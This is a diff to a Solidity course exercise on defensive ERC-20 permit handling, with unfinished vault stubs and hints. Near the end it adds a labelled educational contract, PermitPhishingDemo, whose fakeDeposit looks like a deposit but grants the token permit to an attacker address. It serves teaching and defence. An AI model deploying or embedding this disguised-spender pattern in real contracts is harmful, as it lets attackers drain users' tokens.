@@ -15,7 +15,7 @@ pragma solidity ^0.8.19;
 // ============================================================================
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import {IERC20Permit} from "../exercise1-permit-vault/PermitVault.sol";
+import {IERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
 
 // --- Custom Errors ---
 error InsufficientAllowance();
@@ -26,6 +26,8 @@ error TransferFailed();
 // =============================================================
 /// @notice Vault with defensive permit handling.
 /// @dev Handles front-running, non-permit tokens, and various edge cases gracefully.
+// See: Module 3 > Safe Permit Patterns (#safe-permit-patterns)
+// See: Module 3 > Permit Attack Vectors (#permit-attack-vectors)
 contract SafePermitVault {
     mapping(address user => mapping(address token => uint256 balance)) public balances;
 
@@ -57,21 +59,13 @@ contract SafePermitVault {
         bytes32 s
     ) external {
         // TODO: Implement
-        // 1. Try to execute permit in a try/catch block:
-        //    try IERC20Permit(token).permit(msg.sender, address(this), amount, deadline, v, r, s) {
-        //        // Permit succeeded
-        //    } catch {
-        //        // Permit failed - check if we have allowance anyway
-        //        uint256 allowance = IERC20(token).allowance(msg.sender, address(this));
-        //        if (allowance < amount) {
-        //            revert InsufficientAllowance();
-        //        }
-        //        emit FallbackToApprove(msg.sender, token);
-        //    }
-        //
-        // 2. Transfer tokens using transferFrom (will work if permit succeeded OR allowance exists)
-        // 3. Update balances
-        // 4. Emit Deposit event
+        // 1. Wrap the permit call in try/catch — if it fails (front-run, already used),
+        //    check if the spender already has sufficient allowance and proceed
+        // 2. If permit failed AND allowance is insufficient, revert InsufficientAllowance()
+        // 3. If permit failed but allowance exists, emit FallbackToApprove(msg.sender, token)
+        // 4. Transfer tokens using transferFrom (works if permit succeeded OR allowance existed)
+        // 5. Update balances and emit Deposit event
+        // Hint: Use try IERC20Permit(token).permit(...) { } catch { check allowance }
         revert("Not implemented");
     }
 
@@ -97,11 +91,12 @@ contract SafePermitVault {
         bool usePermit
     ) external {
         // TODO: Implement
-        // 1. If usePermit is true, try permit (same as safeDepositWithPermit)
+        // 1. If usePermit is true, try permit (same try/catch pattern as safeDepositWithPermit)
         // 2. Whether permit succeeded or not, verify allowance is sufficient
-        // 3. Transfer tokens
+        // 3. Transfer tokens using transferFrom
         // 4. Update balances
         // 5. Emit appropriate events
+        // Hint: Reuse the try/catch pattern from safeDepositWithPermit
         revert("Not implemented");
     }
 
@@ -125,17 +120,8 @@ contract SafePermitVault {
         // 1. Try calling permit in a try/catch
         // 2. Return true if succeeded, false if failed
         // 3. Emit PermitFailed event with reason if it failed
-        //
-        // Hint: You can catch the error message like this:
-        //       try IERC20Permit(token).permit(...) {
-        //           return true;
-        //       } catch Error(string memory reason) {
-        //           emit PermitFailed(token, reason);
-        //           return false;
-        //       } catch {
-        //           emit PermitFailed(token, "Unknown error");
-        //           return false;
-        //       }
+        // Hint: try/catch can capture error strings with `catch Error(string memory reason)`
+        //       and handle unknown errors with a bare `catch` block
         revert("Not implemented");
     }
 
@@ -173,6 +159,40 @@ contract SafePermitVault {
 
     function getBalance(address user, address token) external view returns (uint256) {
         return balances[user][token];
+    }
+}
+
+// =============================================================
+//  PROVIDED — Permit Phishing Demonstration
+// =============================================================
+/// @notice Demonstrates how a malicious contract can exploit permit signatures.
+/// @dev EDUCATIONAL ONLY — study the test to understand the attack vector.
+///      In a real phishing attack, the malicious frontend tricks the user into
+///      signing a permit where the spender is the attacker, not the vault.
+contract PermitPhishingDemo {
+    address public attacker;
+
+    constructor(address _attacker) {
+        attacker = _attacker;
+    }
+
+    /// @notice Looks like a legitimate deposit, but the permit approves the attacker.
+    /// @dev The user signs a permit thinking they're depositing, but the spender
+    ///      in the signature is the attacker's address, not this contract.
+    function fakeDeposit(
+        address token,
+        uint256 amount,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external {
+        // The spender is the attacker, NOT address(this)!
+        // In a real attack, the malicious frontend would generate the
+        // permit signature with attacker as spender, but display
+        // "Approve deposit to Vault" in the UI.
+        IERC20Permit(token).permit(msg.sender, attacker, amount, deadline, v, r, s);
+        // At this point, attacker can call token.transferFrom(user, attacker, amount)
     }
 }
 
